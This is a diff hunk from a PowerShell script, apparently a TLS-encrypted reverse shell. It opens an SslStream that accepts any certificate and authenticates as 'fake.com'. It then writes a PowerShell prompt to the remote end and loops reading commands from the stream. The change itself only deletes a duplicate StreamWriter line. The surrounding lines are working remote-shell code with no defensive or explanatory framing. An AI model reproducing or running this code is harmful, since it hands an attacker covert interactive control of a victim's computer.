@@ -5,7 +5,6 @@ $SSL = New-Object System.Net.Security.SslStream($transferencia,$false,({$True} -
 $SSL.AuthenticateAsClient('fake.com', $null, "Tls12", $false);
 $Escribir = new-object System.IO.StreamWriter($SSL);
 $Bfr = new-object System.Byte[] 1024;
-$Escribir = new-object System.IO.StreamWriter($SSL)
 $Escribir.Write('PS ' + (pwd).Path + '> ')
 $Escribir.flush()
 while(($i = $SSL.Read($Bfr, 0, $Bfr.Length)) -ne 0)
